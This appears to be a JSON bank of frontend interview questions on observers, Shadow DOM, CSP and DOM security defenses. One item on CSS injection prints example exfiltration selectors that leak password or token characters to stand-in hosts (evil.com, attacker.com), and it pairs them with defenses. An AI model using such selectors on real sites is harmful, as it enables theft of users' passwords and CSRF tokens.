    "detailedExplanation": "- **Cryptographic Generation**: Must be generated by a cryptographically secure pseudo-random number generator (CSPRNG) with at least 128 bits of entropy.\n- **Per-Request Freshness**: Each HTTP response must have a unique nonce that is never reused.\n- **Cache Exclusion**: Responses with nonces must declare `Cache-Control: no-store` to prevent caching proxies from sharing nonces across users.",
    "codeExample": "// Server-side pseudocode for CSP nonce generation:\n// const nonce = crypto.randomBytes(16).toString('base64');\n// res.setHeader('Content-Security-Policy', `script-src 'nonce-${nonce}'`);",
    "interviewTips": [
      "State that cached or static nonces completely defeat CSP security because attackers can simply copy the static nonce."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "Shared IntersectionObserver Pattern",
    "difficulty": "INTERMEDIATE",
    "questionType": "PERFORMANCE",
    "question": "Why should you use a single shared IntersectionObserver instance rather than creating an observer for every element?",
    "shortAnswer": "A single shared observer creates only one internal browser watcher and one callback queue, significantly reducing memory consumption and CPU overhead compared to hundreds of separate observer instances.",
    "detailedExplanation": "- **Resource Pooling**: One observer can watch thousands of elements via `observer.observe(target)`.\n- **Target Identification**: Inside the callback, `entry.target` uniquely identifies which specific element intersected.\n- **Clean Teardown**: Calling `observer.disconnect()` clears all tracked elements at once.",
    "codeExample": "const sharedLazyObserver = new IntersectionObserver((entries, observer) => {\n  entries.forEach(entry => {\n    if (entry.isIntersecting) {\n      const img = entry.target;\n      img.src = img.dataset.src;\n      observer.unobserve(img); // Unobserves target once loaded\n    }\n  });\n});\n\n// One shared instance observing 500 images:\ndocument.querySelectorAll('img[data-src]').forEach(img => {\n  sharedLazyObserver.observe(img);\n});",
    "interviewTips": [
      "Propose the single shared observer pattern as a key performance optimization for infinite feeds and lazy loaded image galleries."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "IntersectionObserverEntry Geometry Properties",
    "difficulty": "INTERMEDIATE",
    "questionType": "CONCEPTUAL",
    "question": "What is the difference between boundingClientRect, intersectionRect, and rootBounds in IntersectionObserverEntry?",
    "shortAnswer": "`boundingClientRect` is the full rectangle of the target element; `intersectionRect` is the portion of the target currently visible; `rootBounds` is the rectangle of the viewport or scroll container.",
    "detailedExplanation": "- **boundingClientRect**: The target's complete dimensions (`width`, `height`, `top`, `bottom`).\n- **intersectionRect**: The overlapping rectangle where target and root meet (has `width: 0, height: 0` if not intersecting).\n- **rootBounds**: Dimensions of the root container (accounting for `rootMargin`).\n- **Ratio Formula**: `intersectionRatio = intersectionRect area / boundingClientRect area`.",
    "codeExample": "const observer = new IntersectionObserver(([entry]) => {\n  console.log('Target total height:', entry.boundingClientRect.height);\n  console.log('Currently visible height:', entry.intersectionRect.height);\n  console.log('Visibility ratio:', entry.intersectionRatio);\n});",
    "interviewTips": [
      "Explain that `intersectionRect` divided by `boundingClientRect` yields `intersectionRatio`."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "Lazy Loading Background Images",
    "difficulty": "INTERMEDIATE",
    "questionType": "CODE",
    "question": "How do you lazy load CSS background images using IntersectionObserver?",
    "shortAnswer": "Store the image URL in `data-bg` and assign `entry.target.style.backgroundImage = `url(${entry.target.dataset.bg})`` when `entry.isIntersecting` becomes true.",
    "detailedExplanation": "- **No HTML Tag**: Background images in CSS download automatically if declared in stylesheets; deferring requires setting them via JS.\n- **Unobserve**: Immediately call `observer.unobserve(entry.target)` after setting the background.\n- **Fade-in**: Add a CSS class for smooth opacity transitions when the background loads.",
    "codeExample": "const bgObserver = new IntersectionObserver((entries, observer) => {\n  entries.forEach(entry => {\n    if (entry.isIntersecting) {\n      const el = entry.target;\n      el.style.backgroundImage = `url('${el.dataset.bg}')`;\n      el.classList.add('bg-loaded');\n      observer.unobserve(el);\n    }\n  });\n});\n\ndocument.querySelectorAll('.lazy-bg').forEach(el => bgObserver.observe(el));",
    "interviewTips": [
      "Mention that CSS background images download as soon as CSS rules match, so `data-bg` is required for deferred loading."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "Attribute-Only MutationObserver",
    "difficulty": "INTERMEDIATE",
    "questionType": "CODE",
    "question": "How do you configure a MutationObserver to listen strictly to specific attribute changes while ignoring DOM additions?",
    "shortAnswer": "Set `attributes: true` and specify the exact attributes in the `attributeFilter: ['class', 'data-status']` array, while setting `childList: false`.",
    "detailedExplanation": "- **Selective Filtering**: Prevents callback execution when unmonitored attributes (like `id` or `title`) change.\n- **Performance**: High performance because the browser skips filtering irrelevant DOM mutations.\n- **Previous Values**: Set `attributeOldValue: true` if you need to compare old and new attribute strings.",
    "codeExample": "const observer = new MutationObserver((mutations) => {\n  for (const m of mutations) {\n    console.log(`Attribute ${m.attributeName} changed! Old value: ${m.oldValue}`);\n  }\n});\n\nobserver.observe(document.querySelector('#profile-card'), {\n  attributes: true,\n  attributeFilter: ['data-theme', 'class'],\n  attributeOldValue: true\n});",
    "interviewTips": [
      "Emphasize `attributeFilter` and `attributeOldValue: true` for surgical attribute tracking."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "attachShadow vs shadowRoot",
    "difficulty": "INTERMEDIATE",
    "questionType": "COMPARISON",
    "question": "What is the difference between element.attachShadow() and element.shadowRoot?",
    "shortAnswer": "`attachShadow({ mode })` is the method that creates and attaches a new shadow root to an element; `shadowRoot` is the read-only property used to access that attached shadow root afterward.",
    "detailedExplanation": "- **Single Call Only**: Calling `attachShadow()` more than once on the same element throws a `DOMException`.\n- **Unsupported Elements**: Only specific elements can host shadow roots (e.g. custom elements, `<div>`, `<article>`, `<p>`); elements like `<input>` or `<img>` throw errors.\n- **closed Mode**: If attached with `mode: 'closed'`, `element.shadowRoot` returns `null`.",
    "codeExample": "const customCard = document.querySelector('custom-card');\n\n// Attaches shadow root (runs once in constructor):\n// const root = customCard.attachShadow({ mode: 'open' });\n\n// Accesses existing shadow root:\nconsole.log(customCard.shadowRoot instanceof ShadowRoot); // true",
    "interviewTips": [
      "Mention that `attachShadow()` can only be called once per element; subsequent calls throw an error."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "Passing Complex Data to Web Components",
    "difficulty": "INTERMEDIATE",
    "questionType": "CONCEPTUAL",
    "question": "Why should complex data (arrays, objects) be passed to Web Components via JavaScript properties rather than HTML attributes?",
    "shortAnswer": "HTML attributes can only store strings, requiring expensive `JSON.stringify()` and `JSON.parse()` cycles and risking data corruption. JavaScript properties accept raw object references directly.",
    "detailedExplanation": "- **String Limitation**: `setAttribute('users', usersArray)` converts the array into `'[object Object]'` unless serialized.\n- **Performance**: Passing 1,000 objects by reference has zero serialization overhead.\n- **Getters & Setters**: Use property getters/setters on the Web Component class to trigger internal re-renders when properties update.",
    "codeExample": "class DataTable extends HTMLElement {\n  set items(data) {\n    this._items = data;\n    this.render(); // Re-renders cleanly using raw array reference\n  }\n  get items() {\n    return this._items;\n  }\n}\ncustomElements.define('data-table', DataTable);\n\n// Direct JavaScript property assignment:\nconst table = document.querySelector('data-table');\ntable.items = [{ id: 1, name: 'Alice' }, { id: 2, name: 'Bob' }];",
    "interviewTips": [
      "Rule of thumb: Primitive configs belong in attributes; complex arrays and objects belong in JavaScript properties."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Native HTML Escaping Function",
    "difficulty": "INTERMEDIATE",
    "questionType": "CODE",
    "question": "How do you write a lightweight, foolproof function to escape HTML special characters in JavaScript without regex?",
    "shortAnswer": "Create a detached `<div>` in memory, assign the string to its `textContent`, and return its `innerHTML`.",
    "detailedExplanation": "- **Browser Native Escaping**: Leverages the browser engine's C++ parser to escape `&`, `<`, `>`, `\"`, and `'` perfectly.\n- **Zero External Dependencies**: Works in any browser environment with zero library weight.\n- **In-Memory Safety**: Because the div is never attached to the document, no visual reflow or script execution can occur.",
    "codeExample": "function escapeHtml(string) {\n  const div = document.createElement('div');\n  div.textContent = string; // Engine escapes characters automatically\n  return div.innerHTML;    // Returns escaped entities like &lt; &gt; &amp;\n}\n\nconsole.log(escapeHtml('<script>alert(\"XSS\")</script>'));\n// '&lt;script&gt;alert(\"XSS\")&lt;/script&gt;'",
    "interviewTips": [
      "Highlight this 'createElement div textContent -> innerHTML' trick as an elegant interview solution for HTML escaping."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "CSP style-src and DOM element.style",
    "difficulty": "INTERMEDIATE",
    "questionType": "SECURITY",
    "question": "How does Content-Security-Policy style-src affect JavaScript inline style modifications?",
    "shortAnswer": "Setting `style-src 'self'` blocks raw `<style>` tags and HTML `style=\"...\"` attributes, but direct JavaScript property assignments like `element.style.color = 'blue'` are allowed because they modify the CSSOM directly.",
    "detailedExplanation": "- **String vs CSSOM**: CSP blocks string parsing of inline style blocks (`style=\"...\"`), but allows programmatic CSSOM manipulation via `element.style.setProperty()`.\n- **style-src 'unsafe-inline'**: Required if third-party libraries inject raw CSS strings via `element.setAttribute('style', '...')`.\n- **Nonce for Styles**: `<style nonce=\"...\">` allows secure static stylesheets without allowing arbitrary inline styles.",
    "codeExample": "// Allowed under strict CSP style-src (direct CSSOM mutation):\nelement.style.color = '#10b981';\nelement.style.setProperty('font-size', '16px');\n\n// BLOCKED under strict CSP (triggers string attribute parsing):\n// element.setAttribute('style', 'color: #10b981; font-size: 16px;');",
    "interviewTips": [
      "Distinguish between `element.style.color = ...` (CSSOM mutation, allowed) and `element.setAttribute('style', ...)` (blocked by strict CSP)."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "Autonomous vs Template Wrappers",
    "difficulty": "INTERMEDIATE",
    "questionType": "CONCEPTUAL",
    "question": "What is the difference between an Autonomous Custom Element and an HTML5 Template wrapper?",
    "shortAnswer": "An autonomous custom element has custom tag semantics, JavaScript lifecycle callbacks, and encapsulated behavior; an HTML5 template is an inert storage container that only activates when cloned into the DOM.",
    "detailedExplanation": "- **Autonomous Custom Element**: Full citizen of the DOM with interactive lifecycle hooks (`connectedCallback`, `attributeChangedCallback`).\n- **HTML5 `<template>`**: Passive container holding inert nodes (`content.cloneNode(true)`) with no behavior or lifecycle.\n- **Combination**: Best practice is to use `<template>` inside custom element definitions for fast, efficient DOM cloning.",
    "codeExample": "const template = document.createElement('template');\ntemplate.innerHTML = `<style>.card { padding: 16px; }</style><div class=\"card\"><slot></slot></div>`;\n\nclass CustomCard extends HTMLElement {\n  constructor() {\n    super();\n    this.attachShadow({ mode: 'open' });\n    // Combines custom element lifecycle with template cloning:\n    this.shadowRoot.appendChild(template.content.cloneNode(true));\n  }\n}\ncustomElements.define('custom-card', CustomCard);",
    "interviewTips": [
      "Show how templates and custom elements complement each other: templates store the HTML; custom elements provide the lifecycle."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "innerText vs textContent Security Nuances",
    "difficulty": "INTERMEDIATE",
    "questionType": "COMPARISON",
    "question": "Why is textContent preferred over innerText from both a security and performance standpoint?",
    "shortAnswer": "`textContent` retrieves and writes raw text without triggering reflow, while `innerText` forces synchronous layout calculation to evaluate CSS visibility (`display: none`) and can execute layout-sensitive mutations.",
    "detailedExplanation": "- **Performance**: `innerText` is layout-aware; reading it forces a reflow to compute if elements are hidden by CSS. `textContent` reads the DOM tree directly without reflow.\n- **Script Nodes**: `textContent` returns text inside `<script>` and `<style>` tags; `innerText` excludes hidden tags.\n- **Consistency**: `textContent` behavior is standardized across all engines, while `innerText` historic implementations varied.",
    "codeExample": "const box = document.querySelector('#content');\n\n// Fast & Safe (no reflow, standard C++ text write):\nbox.textContent = userMessage;\n\n// Slower (forces synchronous layout check):\n// box.innerText = userMessage;",
    "interviewTips": [
      "Always prefer `textContent`: it bypasses layout reflows and provides predictable, standard text handling."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "ResizeObserver and CSS Container Queries",
    "difficulty": "DIFFICULT",
    "questionType": "COMPARISON",
    "question": "When should you use modern CSS Container Queries (@container) instead of JavaScript ResizeObserver?",
    "shortAnswer": "Use CSS Container Queries for purely visual, styling, and layout responsiveness based on container size; use ResizeObserver when JavaScript logic (like re-rendering canvas charts or virtual list recalculations) is required.",
    "detailedExplanation": "- **CSS Engine Optimization**: CSS `@container (min-width: 400px)` runs directly inside the browser's C++ style engine without main-thread JavaScript execution.\n- **Zero Script Overhead**: Eliminates JavaScript observer callbacks, rAF debounces, and class toggling.\n- **When JS is Still Needed**: ResizeObserver remains mandatory for Canvas resizing, WebGL redraws, SVG re-computations, and pagination sizing.",
    "codeExample": "/* Modern CSS Container Query (No JavaScript ResizeObserver needed!): */\n.card-container {\n  container-type: inline-size;\n}\n\n@container (min-width: 500px) {\n  .card {\n    display: grid;\n    grid-template-columns: 200px 1fr;\n  }\n}",
    "interviewTips": [
      "State that CSS container queries have replaced ResizeObserver for 90% of responsive UI layout needs."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "MutationObserver Across Closed Shadow Roots",
    "difficulty": "DIFFICULT",
    "questionType": "CONCEPTUAL",
    "question": "Can a MutationObserver attached to the document root observe mutations occurring inside a component's Shadow Root?",
    "shortAnswer": "No, MutationObserver traversal stops at Shadow DOM boundaries; mutations occurring inside a shadow root (open or closed) will NOT be reported to an observer watching the document root.",
    "detailedExplanation": "- **Encapsulation Boundary**: Shadow roots are separate document fragments disconnected from the outer document tree.\n- **Observing Internals**: You must explicitly call `observer.observe(customEl.shadowRoot, ...)` on the shadow root itself.\n- **Closed Shadow Barrier**: For `mode: 'closed'`, outer scripts cannot access the shadow root, making it impossible to attach an observer from the outside.",
    "codeExample": "const observer = new MutationObserver((mutations) => {\n  console.log('Document mutation'); // NEVER triggers for mutations inside shadow DOM!\n});\nobserver.observe(document.body, { childList: true, subtree: true });",
    "interviewTips": [
      "Emphasize that `subtree: true` on the document does NOT penetrate into Shadow Roots."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "CSS Injection Token Exfiltration Attacks",
    "difficulty": "DIFFICULT",
    "questionType": "SECURITY",
    "question": "How can CSS injection in the DOM be used by attackers to steal sensitive user inputs or CSRF tokens without JavaScript?",
    "shortAnswer": "Attackers use CSS attribute selectors with background image URLs (e.g. `input[value^='a'] { background: url('//evil.com?c=a') }`) to sequentially exfiltrate user keystrokes to an attacker's server.",
    "detailedExplanation": "- **Attribute Selectors**: `input[name=\"csrf\"][value^=\"A\"]` tests if the token starts with 'A'. If true, the browser fetches the background image from the attacker's server.\n- **Recursive Exfiltration**: By combining multiple rules, the attacker reconstructs the token character by character.\n- **Defense**: Restrict dynamic CSS injection, sanitize user-generated stylesheets, and deploy strict CSP `style-src`.",
    "codeExample": "/* Concept of CSS Attribute Exfiltration: */\n/* input[type=\"password\"][value^=\"p\"] { background-image: url(\"https://attacker.com/leak?char=p\"); } */\n/* input[type=\"password\"][value^=\"pa\"] { background-image: url(\"https://attacker.com/leak?char=a\"); } */",
    "interviewTips": [
      "Mention CSS attribute selector token exfiltration as proof that CSS injection is a genuine security threat."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Cross-Origin Iframe DOM Same-Origin Policy",
    "difficulty": "DIFFICULT",
    "questionType": "SECURITY",
    "question": "What happens when JavaScript attempts to access the DOM of a cross-origin iframe (iframe.contentDocument)?",
    "shortAnswer": "The browser throws a SecurityError (DOMException) under the Same-Origin Policy, blocking all reading and writing of elements, cookies, and URLs inside cross-origin iframes.",
    "detailedExplanation": "- **Same-Origin Boundary**: Protocol, domain, and port must match exactly.\n- **Accessible Properties**: Only `window.postMessage`, `window.location.replace` (write-only), and `window.frames.length` are accessible.\n- **Document Access**: `iframe.contentDocument` returns `null` or throws an error.\n- **Safe Communication**: Use `window.postMessage(data, targetOrigin)` with strict origin verification.",
    "codeExample": "const iframe = document.querySelector('#partner-frame');\n\ntry {\n  // Throws DOMException: Blocked a frame with origin from accessing a cross-origin frame:\n  const secret = iframe.contentDocument.querySelector('#token').value;\n} catch (err) {\n  console.warn('Cross-origin DOM access correctly blocked by Same-Origin Policy:', err);\n}",
    "interviewTips": [
      "List the three elements of an origin: protocol, domain, and port. All three must match for DOM access."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "JSON Vulnerability Prefixes (XSSI Protection)",
    "difficulty": "DIFFICULT",
    "questionType": "SECURITY",
    "question": "Why do APIs from Google and Facebook prefix JSON responses with )]}',\\n before sending them to the client?",
    "shortAnswer": "It prevents Cross-Site Script Inclusion (XSSI) attacks: if an attacker tries to include the API endpoint via a `<script src=\"...\">` tag, the prefix triggers a syntax error immediately, preventing the JSON data from being read.",
    "detailedExplanation": "- **XSSI Mechanism**: Ancient browsers allowed overriding `Array` constructors to steal JSON arrays loaded via `<script src=\"/api/user\">`.\n- **Prefix Defense**: The prefix `)]}',\\n` makes the response invalid JavaScript syntax, causing `<script>` execution to abort with an error.\n- **Client Strip**: Valid AJAX/Fetch clients strip the prefix (`response.text().then(t => JSON.parse(t.replace(/^\\)\\]}',\\n/, ''))`) before parsing.",
    "codeExample": "// Client-side handling of secure prefixed JSON responses:\nasync function fetchSecureData(url) {\n  const res = await fetch(url);\n  let raw = await res.text();\n  // Strips security prefix before parsing JSON:\n  raw = raw.replace(/^\\)\\]}',\\n/, '');\n  return JSON.parse(raw);\n}",
    "interviewTips": [
      "Cite the `)]}',\\n` prefix as standard defense-in-depth against Cross-Site Script Inclusion (XSSI)."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "Micro-Frontend Encapsulation via Shadow DOM",
    "difficulty": "DIFFICULT",
    "questionType": "ARCHITECTURE",
    "question": "How does Shadow DOM provide architectural boundaries for Micro-Frontend applications?",
    "shortAnswer": "Shadow DOM provides complete CSS isolation and DOM scoping, allowing different teams to deploy independent micro-frontends with conflicting CSS classes or framework versions on the same page without style collisions.",
    "detailedExplanation": "- **CSS Isolation**: Global styles in one micro-frontend cannot leak into or break sibling micro-frontends.\n- **Event Retargeting**: Normalizes events so container apps only see interactions from the component root.\n- **Lifecycle Sandboxing**: Each micro-frontend wraps its mounting and unmounting logic within `connectedCallback` and `disconnectedCallback`.",
    "codeExample": "class TeamAMicroFrontend extends HTMLElement {\n  connectedCallback() {\n    const shadow = this.attachShadow({ mode: 'open' });\n    // Mounts isolated React/Vue app inside shadow DOM:\n    this.appInstance = mountTeamAApp(shadow);\n  }\n  disconnectedCallback() {\n    this.appInstance?.unmount();\n  }\n}\ncustomElements.define('team-a-app', TeamAMicroFrontend);",
    "interviewTips": [
      "Mention Shadow DOM as a core architectural building block for resilient multi-team micro-frontends."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "IntersectionObserver with CSS 3D Transforms",
    "difficulty": "DIFFICULT",
    "questionType": "CONCEPTUAL",
    "question": "How does IntersectionObserver compute intersection ratios when elements are transformed with 3D rotations or scales?",
    "shortAnswer": "IntersectionObserver calculates the 2D axis-aligned bounding box of the transformed element in the viewport's coordinate space, projecting the 3D transformed bounds onto a 2D plane.",
    "detailedExplanation": "- **Axis-Aligned Bounding Box (AABB)**: If an element is rotated by 45 degrees, the observer bounds are calculated from the smallest non-rotated rectangle enclosing the rotated element.\n- **intersectionRatio Impact**: Because the AABB is larger than the original unrotated element area, the reported `intersectionRatio` may not match simple visual intuitions.\n- **Invisible Planes**: If scaled to `scale(0)` or rotated 90 degrees edge-on, `isIntersecting` evaluates to `false`.",
    "codeExample": "/* Rotated element produces an expanded 2D axis-aligned bounding box: */\n.tilted-banner {\n  transform: rotate(45deg);\n}",
    "interviewTips": [
      "Mention that browsers project 3D transforms onto 2D Axis-Aligned Bounding Boxes (AABB) for intersection calculations."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Secure Cookie DOM Attributes (SameSite, Secure, HttpOnly)",
    "difficulty": "DIFFICULT",
    "questionType": "SECURITY",
    "question": "How do document.cookie limitations mandate using server-set HttpOnly, Secure, and SameSite cookie flags?",
    "shortAnswer": "JavaScript `document.cookie` cannot set the `HttpOnly` flag. If sensitive session cookies lack `HttpOnly`, any DOM XSS payload can immediately read and exfiltrate them via `document.cookie`.",
    "detailedExplanation": "- **HttpOnly Flag**: Can only be set by the server via `Set-Cookie` headers; completely hides the cookie from client JavaScript `document.cookie`.\n- **SameSite=Strict/Lax**: Prevents the browser from sending cookies on cross-origin requests, neutralizing CSRF attacks.\n- **Secure Flag**: Ensures cookies are transmitted only over encrypted HTTPS connections.\n- **document.cookie Scope**: Should only ever be used for non-sensitive UI preferences (like light/dark mode).",
    "codeExample": "// In client JavaScript, reading document.cookie only reveals non-HttpOnly cookies:\nconsole.log(document.cookie); // \"theme=dark; consent=true\" (Auth token is invisible!)",
    "interviewTips": [
      "Emphasize that `HttpOnly` cannot be set by client-side JavaScript—it is strictly a server-controlled security barrier."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "DOM Clobbering Mitigation with Object.prototype",
    "difficulty": "DIFFICULT",
    "questionType": "SECURITY",
    "question": "How do you protect JavaScript utility libraries from DOM Clobbering when checking object properties?",
    "shortAnswer": "Always invoke methods from the prototype directly (e.g. `Object.prototype.hasOwnProperty.call(obj, prop)`) instead of `obj.hasOwnProperty(prop)`, because an injected HTML input can clobber the property.",
    "detailedExplanation": "- **The Trap**: If an object represents form elements or window properties, an attacker's `<input id=\"hasOwnProperty\">` replaces the function with an HTMLInputElement.\n- **Safe Invocation**: Calling from the prototype guarantees execution of the genuine native function.\n- **Object.hasOwn()**: Modern JavaScript provides `Object.hasOwn(obj, prop)` as a clean, clobber-proof built-in method.",
    "codeExample": "const form = document.querySelector('form');\n\n// VULNERABLE if form contains <input name=\"hasOwnProperty\">:\n// form.hasOwnProperty('email'); // TypeError: form.hasOwnProperty is not a function!\n\n// 100% SAFE across all inputs:\nObject.hasOwn(form, 'email');\n// or: Object.prototype.hasOwnProperty.call(form, 'email');",
    "interviewTips": [
      "Recommend `Object.hasOwn()` as modern standard best practice to defeat property clobbering."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "Observing Iframe DOM and Cross-Origin Restrictions",
    "difficulty": "DIFFICULT",
    "questionType": "CODE",
    "question": "Can a MutationObserver on the main page observe DOM changes inside an <iframe>?",
    "shortAnswer": "Yes, but ONLY if the iframe is strictly Same-Origin (`iframe.contentDocument` is accessible). If the iframe is Cross-Origin, browser security blocks all observer attachment.",
    "detailedExplanation": "- **Same-Origin Access**: If origin matches, attach observer directly via `observer.observe(iframe.contentDocument.body, { childList: true, subtree: true })`.\n- **Cross-Origin Barrier**: Accessing `contentDocument` throws a `SecurityError`.\n- **Cross-Origin Bridge**: For cross-origin iframes, the iframe's internal script must run its own MutationObserver and post serialized mutation summaries via `window.postMessage`.",
    "codeExample": "const iframe = document.querySelector('#same-origin-frame');\n\niframe.addEventListener('load', () => {\n  try {\n    const iframeDoc = iframe.contentDocument;\n    const observer = new MutationObserver((mutations) => {\n      console.log('Mutation inside same-origin iframe detected!');\n    });\n    observer.observe(iframeDoc.body, { childList: true, subtree: true });\n  } catch (err) {\n    console.warn('Cross-origin iframe DOM cannot be observed:', err);\n  }\n});",
    "interviewTips": [
      "Explain the difference: Same-origin allows direct observer attachment; cross-origin requires `postMessage` relaying."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Creating Strict Trusted Types HTML Policy",
    "difficulty": "DIFFICULT",
    "questionType": "CODE",
    "question": "How do you implement a strict Trusted Types policy using DOMPurify that rejects unsafe scripts?",
    "shortAnswer": "Create a policy via `trustedTypes.createPolicy('dompurify', { createHTML: input => DOMPurify.sanitize(input, { SAFE_FOR_TEMPLATES: true }) })`.",
    "detailedExplanation": "- **Enforcement**: Once registered, all assignments to `element.innerHTML` must pass through `policy.createHTML()`.\n- **Auditability**: Security teams can grep the codebase for `createPolicy` to audit all DOM sink mutation sites in one central location.\n- **TypeError Thrown**: Any direct string assignment throws a `TypeError: Failed to set the 'innerHTML' property on 'Element': This document requires 'TrustedHTML' assignment.`",
    "codeExample": "let sanitizerPolicy;\n\nif (window.trustedTypes) {\n  sanitizerPolicy = window.trustedTypes.createPolicy('default', {\n    createHTML: (dirty) => DOMPurify.sanitize(dirty),\n    createScript: () => { throw new Error('Inline script generation forbidden'); },\n    createScriptURL: (url) => {\n      if (url.startsWith('https://trusted-cdn.example.com/')) return url;\n      throw new Error('Untrusted script source');\n    }\n  });\n}\n\n// Safe sink mutation:\nconst safeHTML = sanitizerPolicy ? sanitizerPolicy.createHTML(userInput) : DOMPurify.sanitize(userInput);\ncontainer.innerHTML = safeHTML;",
    "interviewTips": [
      "Write out a complete Trusted Types policy implementation to showcase senior-level web security architecture."
    ]
  }
];
